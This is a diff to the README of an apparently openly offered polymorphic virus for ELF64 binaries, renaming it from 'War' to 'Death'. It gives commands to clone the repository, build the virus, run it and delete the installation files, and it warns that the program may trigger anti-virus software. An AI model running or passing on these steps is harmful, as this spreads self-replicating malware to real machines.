@@ -1,4 +1,4 @@
-# War
+# Death
 
 A polymorphic Virus for Elf64 binaries
 
@@ -8,11 +8,11 @@ This might trigger your anti-virus, which is normal. Use at your own risk!
 
 ```bash
 # clone it
-git clone https://github.com/spolowy/War.git && cd War
+git clone https://github.com/spolowy/Death.git && cd Death
 # build it and run it
-make && ./war
+make && ./death
 # remove installation files
-cd .. && rm -rf War
+cd .. && rm -rf Death
 ```
 
 ## Features
